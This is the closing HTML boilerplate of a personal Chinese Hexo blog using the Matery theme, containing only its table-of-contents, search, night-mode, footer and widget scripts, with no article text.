<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>





    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
